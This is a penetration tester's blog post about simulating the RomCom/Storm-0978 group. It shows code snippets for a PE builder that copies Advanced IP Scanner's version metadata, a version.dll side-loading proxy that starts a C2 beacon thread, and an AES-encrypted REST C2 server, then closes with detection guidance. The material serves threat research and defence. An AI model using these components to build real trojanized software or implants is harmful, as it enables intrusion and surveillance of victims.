<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Portfolio | Nour Alhouseini - Ethical Hacker - Penetration Tester</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
        integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" data-purpose="Layout StyleSheet" title="Web Awesome"
        href="/css/app-wa-3b124ff0e0d7a67cd8c995d0aeb1d15a.css?vsn=d">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/all.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-duotone-solid.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-thin.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-solid.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-regular.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-light.css">
    <link rel="shortcut icon" href="./images/Bring-them-back.png" type="image/x-icon">
    <!-- box icons -->
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>

    <!-- custom css -->
    <link rel="stylesheet" href="../../css/style.css">

    <style>
        .code-block {
            background: rgba(10, 10, 20, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 1rem;
            padding: 2rem 2.4rem;
            margin: 1.5rem 0 2rem;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.35rem;
            line-height: 1.7;
            color: #c9d1d9;
            white-space: pre;
        }

        .technique-table {
            width: 100%;
            border-collapse: collapse;
            margin: 1.5rem 0 2rem;
            font-size: 1.4rem;
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 1rem;
            overflow: hidden;
        }

        .technique-table th {
            text-align: left;
            padding: 1.2rem 1.6rem;
            background: rgba(10, 10, 20, 0.8);
            color: rgba(255, 255, 255, 0.5);
            font-weight: 600;
            font-size: 1.2rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .technique-table td {
            padding: 1.2rem 1.6rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            color: rgba(255, 255, 255, 0.75);
        }

        .technique-table tr:hover td {
            background: rgba(0, 240, 255, 0.03);
        }

        .about-content code {
            font-family: 'JetBrains Mono', monospace;
            background: rgba(10, 10, 20, 0.8);
            padding: 0.2rem 0.6rem;
            border-radius: 0.4rem;
            font-size: 1.4rem;
            color: #00f0ff;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .callout-box {
            border-left: 3px solid #b44aff;
            background: rgba(180, 74, 255, 0.05);
            padding: 2rem 2.4rem;
            border-radius: 0 1rem 1rem 0;
            margin: 2rem 0;
        }

        .section-divider {
            border: none;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.06), transparent);
            margin: 3rem 0;
        }
    </style>
</head>

<body>
    <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>

    <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
    <!-- header design -->
    <header class="header" style="background-color: #1f242df4;">
        <a href="../../index.html" class="logo">Portfolio <sup><i class="fa-classic fa-solid fa-badge-check fa-fw"
                    style="color: #00EEFF;"></i></sup></a>

        <div class='bx bx-menu' id="menu-icon"></div>

        <nav class="navbar">
            <a href="../../index.html#home">&lt;/Home&gt;</a>
            <a href="../../index.html#about">&lt;/About&gt;</a>
            <a href="../../index.html#skills">&lt;/Skills&gt;</a>
            <a href="../../index.html#certificate">&lt;/Education&gt;</a>
            <a href="../../index.html#services">&lt;/Services&gt;</a>
            <a href="../../blogs.html" class="active">&lt;/Blogs&gt;</a>
            <a href="../../index.html#contact">&lt;/Contact&gt;</a>
        </nav>
    </header>

    <!-- blog section -->
    <section class="blog" id="blog">
        <div class="about-img">
            <img src="../../images/Bring-them-back.png" class="machinelogo"
                style="border-radius: 100%; width:20em; height:20em;" alt="RomCom Simulation">
        </div>

        <div class="about-content">

            <h2 class="heading">RomCom / <span>Storm-0978</span></h2>

            <div class="blog-meta">
                <h3>Origin: Russia — Financially & Politically Motivated</h3>
                <p><strong>Aliases:</strong> Storm-0978, Tropical Scorpius, UNC2596, Void Rabisu</p>
                <p><strong>Active Since:</strong> 2022 (publicly attributed)</p>
                <p><strong>Targets:</strong> Government, Defense, IT, Telecommunications — Ukraine, NATO allies, US</p>
                <p><strong>Focus Areas:</strong> Trojanized Software, DLL Side-Loading, Browser Zero-Days</p>
            </div>

            <!-- Overview -->
            <h3><span>Overview</span></h3>
            <p style="font-size: large;">
                RomCom exploits something fundamental about how people install software: they trust the download source.
                The group takes legitimate, widely-used applications — Advanced IP Scanner, PDF-XChange Editor, KeePass,
                Signal, even Firefox — and creates trojanized versions hosted on typosquat domains that are nearly
                indistinguishable from the real thing. The victim gets a fully functional application. They also get a
                Remote Access Trojan.
            </p>
            <p style="font-size: large;">
                In late 2023, RomCom chained two zero-days (CVE-2023-36884 in Windows and CVE-2023-4863 in WebP/libwebp)
                to achieve zero-click code execution through malicious web pages. In 2024, they exploited Firefox
                (CVE-2024-9680, a use-after-free in the animation timeline) chained with a Windows Task Scheduler
                privilege escalation — again requiring only that the victim visit a webpage.
            </p>

            <hr class="section-divider">

            <h3><span>MITRE ATT&CK Mapping</span></h3>

            <table class="technique-table">
                <thead>
                    <tr>
                        <th>Tactic</th>
                        <th>Technique</th>
                        <th>Simulation Tool</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Initial Access</td>
                        <td>T1189 — Drive-by Compromise (typosquat download sites)</td>
                        <td>fake_download_site/</td>
                    </tr>
                    <tr>
                        <td>Execution</td>
                        <td>T1204.002 — Malicious File (trojanized installer)</td>
                        <td>pe_builder.py</td>
                    </tr>
                    <tr>
                        <td>Persistence</td>
                        <td>T1574.002 — DLL Side-Loading (version.dll proxy)</td>
                        <td>dll_sideloader.cpp</td>
                    </tr>
                    <tr>
                        <td>Command & Control</td>
                        <td>T1071.001 — AES-256 encrypted REST C2</td>
                        <td>romcom_c2.py</td>
                    </tr>
                    <tr>
                        <td>Collection</td>
                        <td>T1113 — Screen Capture (GDI-based)</td>
                        <td>screen_capture.py</td>
                    </tr>
                    <tr>
                        <td>Defense Evasion</td>
                        <td>T1036.005 — Masquerading (match legitimate app metadata)</td>
                        <td>pe_builder.py</td>
                    </tr>
                </tbody>
            </table>

            <hr class="section-divider">

            <!-- Trojanized Software -->
            <h3><span>Building Trojanized Software</span></h3>
            <p style="font-size: large;">
                The first piece of the simulation is a PE header builder that creates executables with metadata matching
                legitimate applications. RomCom doesn't just name their malware <code>AdvancedIPScanner.exe</code> —
                they set the <code>FileDescription</code>, <code>CompanyName</code>, <code>ProductVersion</code>, and
                even the <code>LegalCopyright</code> fields to exactly match the real software. Security analysts doing
                triage see legitimate-looking properties in the file's Details tab.
            </p>

            <div class="code-block"># Construct VERSION_INFO resource to match legitimate app
                version_info = {
                'CompanyName': 'Famatech Corp.', # Real company
                'FileDescription': 'Advanced IP Scanner', # Real description
                'FileVersion': '2.5.4594.1', # Real version
                'InternalName': 'advanced_ip_scanner',
                'LegalCopyright': 'Copyright (c) Famatech Corp.',
                'OriginalFilename': 'advanced_ip_scanner.exe',
                'ProductName': 'Advanced IP Scanner',
                'ProductVersion': '2.5.4594.1'
                }

                # Build PE with proper sections: .text, .rdata, .data, .rsrc
                pe = PE()
                pe.add_section('.text', payload_code, characteristics=0x60000020)
                pe.add_section('.rsrc', build_version_resource(version_info))</div>

            <p style="font-size: large;">
                The fake download site is the delivery mechanism — a pixel-perfect clone of the real software vendor's
                page, hosted on a domain like <code>advancedipscanner-download.com</code>. The HTML replicates the real
                site's layout, download buttons, and even the version changelog. JavaScript fingerprints the visitor
                (OS, browser, screen resolution) before serving the payload, and non-target visitors get redirected to
                the legitimate site.
            </p>

            <hr class="section-divider">

            <!-- DLL Side-Loading -->
            <h3><span>DLL Side-Loading: Running in a Trusted Context</span></h3>
            <p style="font-size: large;">
                This is the core persistence mechanism, and it's devastatingly effective. Most Windows applications load
                certain DLLs from their own directory before checking <code>C:\Windows\System32</code>. The classic
                target is <code>version.dll</code> — loaded by hundreds of legitimate applications.
            </p>
            <p style="font-size: large;">
                RomCom drops a malicious <code>version.dll</code> next to the legitimate executable. This DLL
                <strong>forwards every export function</strong> to the real system DLL (so the application works
                perfectly), while simultaneously spawning a background thread that executes the RAT payload. From the
                perspective of EDR/AV, the code is running inside a signed, trusted process.
            </p>

            <div class="code-block">// version.dll — forward all 17 exports to the real DLL
                #pragma comment(linker, "/export:GetFileVersionInfoA=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoA")
                #pragma comment(linker, "/export:GetFileVersionInfoByHandle=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoByHandle")
                #pragma comment(linker, "/export:GetFileVersionInfoExA=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoExA")
                #pragma comment(linker, "/export:GetFileVersionInfoExW=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoExW")
                #pragma comment(linker, "/export:GetFileVersionInfoSizeA=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeA")
                #pragma comment(linker, "/export:GetFileVersionInfoSizeExA=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExA")
                #pragma comment(linker, "/export:GetFileVersionInfoSizeExW=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExW")
                #pragma comment(linker, "/export:GetFileVersionInfoSizeW=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeW")
                #pragma comment(linker, "/export:GetFileVersionInfoW=\
                C:\\Windows\\System32\\version.dll.GetFileVersionInfoW")
                #pragma comment(linker, "/export:VerFindFileA=\
                C:\\Windows\\System32\\version.dll.VerFindFileA")
                #pragma comment(linker, "/export:VerQueryValueA=\
                C:\\Windows\\System32\\version.dll.VerQueryValueA")
                #pragma comment(linker, "/export:VerQueryValueW=\
                C:\\Windows\\System32\\version.dll.VerQueryValueW")

                DWORD WINAPI PayloadThread(LPVOID lpParam) {
                // C2 beacon loop — runs in background while app works normally
                while (true) {
                beacon_to_c2();
                Sleep(BEACON_INTERVAL_MS);
                }
                return 0;
                }

                BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
                if (reason == DLL_PROCESS_ATTACH) {
                DisableThreadLibraryCalls(hModule);
                CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
                }
                return TRUE;
                }</div>

            <p style="font-size: large;">
                Building this hands-on made the detection gap obvious: EDR products that whitelist based on parent
                process name or signer will completely miss this. The fix is monitoring DLL load events and alerting
                when a known system DLL (like <code>version.dll</code>, <code>dbghelp.dll</code>,
                <code>wininet.dll</code>) is loaded from an unusual directory — specifically, not <code>System32</code>
                or <code>SysWOW64</code>.
            </p>

            <hr class="section-divider">

            <!-- C2 and RAT -->
            <h3><span>AES-256 REST C2 Server</span></h3>
            <p style="font-size: large;">
                RomCom's C2 uses standard HTTPS REST endpoints — <code>POST /api/v1/check-in</code>,
                <code>GET /api/v1/tasks/{id}</code> — making the traffic blend into normal web application requests. The
                difference is that every payload is AES-256-CBC encrypted with a pre-shared key, and the encrypted blob
                is base64-encoded before transmission.
            </p>
            <p style="font-size: large;">
                The RAT module includes GDI-based screen capture — using the Windows Graphics Device Interface to
                capture the screen contents without triggering the screenshot detection that some EDR products implement
                for user-space screen capture APIs.
            </p>

            <div class="code-block"># AES-256-CBC encryption for C2 communications
                def encrypt_payload(self, data, key):
                iv = os.urandom(16)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                padded = pad(json.dumps(data).encode(), AES.block_size)
                encrypted = cipher.encrypt(padded)
                return base64.b64encode(iv + encrypted).decode()

                # C2 check-in mimics standard REST API
                @app.route('/api/v1/check-in', methods=['POST'])
                def check_in():
                encrypted = request.json.get('data')
                beacon = decrypt_payload(encrypted, SESSION_KEY)
                # Queue tasks for this implant
                tasks = get_pending_tasks(beacon['implant_id'])
                return jsonify({'data': encrypt_payload(tasks, SESSION_KEY)})</div>

            <hr class="section-divider">

            <!-- Detection -->
            <h3><span>Detection Guidance</span></h3>

            <div class="callout-box">
                <p style="font-size: large;"><strong>Key Challenge:</strong> The malicious DLL runs inside a signed,
                    trusted process. Detection requires monitoring DLL load paths and comparing download sources against
                    known-good vendor domains.</p>
            </div>

            <p style="font-size: large;">
                <strong>What to hunt for:</strong>
            </p>
            <p style="font-size: large;">
                1. DLL load events where system DLLs (<code>version.dll</code>, <code>dbghelp.dll</code>) load from
                non-system directories<br>
                2. Recently registered domains hosting software download pages (typosquat analysis)<br>
                3. PE files with version info matching legitimate software but different code signing certificates<br>
                4. Background threads spawned immediately on DLL_PROCESS_ATTACH in newly loaded DLLs<br>
                5. Encrypted HTTPS POST requests to <code>/api/v1/</code> endpoints with high-entropy base64
                payloads<br>
                6. GDI calls (CreateCompatibleDC, BitBlt) from non-graphical applications
            </p>

            <p style="font-size: large;">
                Full simulation code available on <a style="color:#5EC6FF" href="https://github.com/0xlumos">GitHub</a>.
            </p>

        </div>
    </section>

    <!-- scroll reveal -->
    <script src="https://unpkg.com/scrollreveal"></script>

    <!-- typed js -->
    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>

    <!-- custom js -->
    <script src="../../js/script.js"></script>
</body>

</html>